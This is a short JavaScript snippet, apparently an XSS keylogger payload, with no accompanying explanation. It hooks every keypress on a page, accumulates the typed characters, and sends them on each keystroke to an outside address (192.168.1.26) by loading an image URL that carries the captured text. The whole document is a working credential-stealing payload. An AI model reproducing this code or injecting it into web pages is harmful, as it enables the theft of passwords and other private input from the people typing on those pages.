var key="";
document.onkeypress = function(e) {
    e = e || window.event;
    key += e.key;
    var img = new Image();
    img.src = `http://192.168.1.26:80/${key}`;
}

